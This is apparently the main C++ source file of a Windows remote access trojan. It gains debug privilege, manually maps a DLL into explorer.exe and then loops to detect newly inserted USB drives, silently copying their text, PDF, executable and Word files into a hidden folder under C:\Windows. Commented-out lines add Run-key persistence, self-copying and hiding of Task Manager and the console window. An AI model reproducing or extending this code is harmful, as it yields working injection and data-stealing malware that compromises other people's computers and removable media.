#include "rat.h"

bool IsCorrectTargetArchitecture(HANDLE hProc) {
    BOOL bTarget = FALSE;
    if (!IsWow64Process(hProc, &bTarget)) {
        Logger("Can't confirm target process architecture");
        return false;
    }

    BOOL bHost = FALSE;
    IsWow64Process(GetCurrentProcess(), &bHost);

    return (bTarget == bHost);
}
DWORD pidof(const wchar_t* processImage)
{
    HANDLE hSsnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    DWORD pid = NULL;
    if (hSsnapshot != INVALID_HANDLE_VALUE)
    {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSsnapshot, &pe32))
        {
            do {
                if (!wcscmp(processImage, pe32.szExeFile))
                {
                    pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSsnapshot, &pe32));
        }
        CloseHandle(hSsnapshot);
    }
    return pid;
}

static void controldll(void)
{
    if (PathFileExists(L"chavo_source.dll") == FALSE)
    {
        Logger("chavo_source.dll cant found");
        _exit(1);
    }
    else
    {
        Logger("i found dll");
    }
}

static const void regeditrun()
{
    HKEY hKey;
    if (RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS)
    {
        LPCTSTR regszstring = L"deneme";
        if (RegSetValueEx(hKey, TEXT("systemcli"), 0L, REG_SZ, (CONST BYTE*)regszstring, sizeof(TCHAR) * (strlen((CONST CHAR*)regszstring) + MAX_LENGTH)) == ERROR_SUCCESS) 
        {
            Logger("successfully added to regedit for run");
            RegCloseKey(hKey);
        }
    }
}

static const void copyitself(TCHAR loc[])
{
    TCHAR exename[MAX_PATH];
    DWORD getname = GetModuleFileName(NULL, exename, MAX_PATH);
    if (getname)
    {
        std::filesystem::copy(exename, loc);
    }
    else
    {
        Logger("i cant get exename");
    }
}

std::string createcalofolder(std::string extentions)
{
    std::string makefolder = "mkdir ";
    makefolder += "C:\\Windows\\calo\\";
    makefolder += extentions;
    system(makefolder.c_str());
    std::string calofolder = "C:\\Windows\\calo\\" + extentions + "\\";
    return calofolder;
}

std::string getvolumelabel(LPCWSTR drive)
{
    WCHAR szVolumeName[MAX_PATH];
    BOOL bSucceeded = GetVolumeInformation(drive,
        szVolumeName,
        MAX_PATH,
        NULL,
        NULL,
        NULL,
        NULL,
        0);
    std::wstring wstring(szVolumeName);
    std::string volumelabel(wstring.begin(), wstring.end());
    return volumelabel;
}

static void computerusername(void)
{
    union pc
    {
        char username[MAX_COMPUTERNAME_LENGTH + 1];
    };
    DWORD usernametickcount = MAX_COMPUTERNAME_LENGTH + 1;
    pc computer = { 0 };

    if (!GetComputerNameA(&computer.username[0], &usernametickcount))
    {
        Logger("Fail to get compuer username");
    }
    else
    {
        std::string computerusername1 = "computer username ";
        computerusername1 += static_cast<std::string>(std::string(computer.username));
        Logger(computerusername1);
    }
}

BOOL detectexplorerexerestart()
{
    DWORD ProcessID = pidof(L"explorer.exe");
    HANDLE hHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ProcessID);
    HANDLE hNewHandle;
    RegisterWaitForSingleObject(&hNewHandle, hHandle, WaitOrTimerCallback, NULL, INFINITE, WT_EXECUTEONLYONCE);
    return TRUE;
}

int wmain(int argc, wchar_t* argv[], wchar_t* envp[])
{
    mtx.lock();
    Logger("logs removed");
    system("rmdir c:\\logs /s /Q");
    system("mkdir c:\\logs");
    Logger("logs created");
    Logger("computerusername func");
    computerusername();
    Logger("search dll");
    Logger("starting manual mapping");
    const wchar_t* dllPath = L"C:\\Users\\calo\\source\\repos\\chavo_source\\x64\\Debug\\chavo_source.dll";
    DWORD PID;
    std::string pname = "explorer.exe";
    Logger("Process Name");
    Logger(pname);
    char* vIn = (char*)pname.c_str();
    wchar_t* vOut = new wchar_t[strlen(vIn) + 1];
    mbstowcs_s(NULL, vOut, strlen(vIn) + 1, vIn, strlen(vIn));
    PID = pidof(vOut);
    Logger("Process pid taked");
    TOKEN_PRIVILEGES priv = { 0 };
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        priv.PrivilegeCount = 1;
        priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
            AdjustTokenPrivileges(hToken, FALSE, &priv, 0, NULL, NULL);

        CloseHandle(hToken);
    }

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if (!hProc)
    {
        DWORD Err = GetLastError();
        Logger("OpenProcess failed");
    }

    if (!IsCorrectTargetArchitecture(hProc))
    {
        Logger("Invalid Process Architecture");
        CloseHandle(hProc);
    }

    if (GetFileAttributes(dllPath) == INVALID_FILE_ATTRIBUTES)
    {
        Logger("Dll file doesn't exist");
    }

    std::ifstream File(dllPath, std::ios::binary | std::ios::ate);

    if (File.fail()) {
        Logger("Opening the file failed");
        File.close();
    }

    auto FileSize = File.tellg();
    if (FileSize < 0x1000) {
        Logger("Filesize invalid");
        File.close();
    }

    BYTE* pSrcData = new BYTE[(UINT_PTR)FileSize];
    if (!pSrcData) {
        Logger("Can't allocate dll file");
        File.close();
    }

    File.seekg(0, std::ios::beg);
    File.read((char*)(pSrcData), FileSize);
    File.close();

    Logger("Mapping...");
    if (!ManualMapDll(hProc, pSrcData, FileSize)) {
        delete[] pSrcData;
        CloseHandle(hProc);
        Logger("Error while mapping");
    }
    delete[] pSrcData;
    CloseHandle(hProc);
    Logger("OK");
    Logger("mutex lock has been started");
    //TCHAR loc[] = L"C:\\logs";
    //copyitself(loc);
    //regeditrun();
    //controldll();
    //system("Taskmgr.exe");
    //ShowWindow(GetConsoleWindow(), SW_HIDE);
    //HWND hwnd = FindWindowA(0,("Task Manager"));
    //ShowWindow(hwnd, SW_HIDE);
    Logger("try to get windows folder");
    char buffer[MAX_PATH], drive;
    GetSystemDirectory((LPWSTR)buffer, sizeof(buffer));
    drive = *buffer;
    std::string windowsdir = "in " + drive;
    Logger(windowsdir);
    if (drive == 'C')
    {
        Logger("windows working on c: disk");
    }
    controldevice(DRIVE_LIST);
    Logger("loop has been started");
    for (;;) 
    {
        controldevice(NEW_DRIVE_LIST);
        detectexplorerexerestart();
        if (restartdetected == TRUE)
        {
            Logger("restart detected");
            restartdetected = FALSE;
        }
        for (int i = 0; i < MAX_LENGTH; i++) 
        {
            if ((NEW_DRIVE_LIST[i] >= 65 && NEW_DRIVE_LIST[i] <= 89) && (DRIVE_LIST[i] == '0'))
            {
                Logger("device plugged : ");
                std::string drivelist;
                drivelist.push_back(NEW_DRIVE_LIST[i]);
                Logger(drivelist);
                DRIVE_LIST[i] = NEW_DRIVE_LIST[i];
                std::string newdevices;
                newdevices.push_back(NEW_DRIVE_LIST[i]);
                newdevices += ":\\";
                std::cout << newdevices;
                std::wstring stemp = std::wstring(newdevices.begin(), newdevices.end());
                LPCWSTR sw = stemp.c_str();
                std::string volumelabel = getvolumelabel(sw);
                Logger(volumelabel);
                copy_file_with_extentions(newdevices, createcalofolder(volumelabel + "\\" + txt), txt);
                copy_file_with_extentions(newdevices, createcalofolder(volumelabel + "\\" + pdf), pdf);
                copy_file_with_extentions(newdevices, createcalofolder(volumelabel + "\\" + exe), exe);
                copy_file_with_extentions(newdevices, createcalofolder(volumelabel + "\\" + word), word);
            }
        }
        for (int i = 0; i < MAX_LENGTH; i++) 
        {
            NEW_DRIVE_LIST[i] = '0';
        }
        controldevice(NEW_DRIVE_LIST);
        for (int i = 0; i < MAX_LENGTH; i++) 
        {
            if ((DRIVE_LIST[i] >= 65 && DRIVE_LIST[i] <= 89) && (NEW_DRIVE_LIST[i] == '0')) 
            {
                Logger("device unplagged : ");
                std::string drivelist;
                drivelist.push_back(DRIVE_LIST[i]);
                Logger(drivelist);
                Sleep(500);
                DRIVE_LIST[i] = NEW_DRIVE_LIST[i];
            }
        }
        Sleep(200);
    }
    mtx.unlock();
}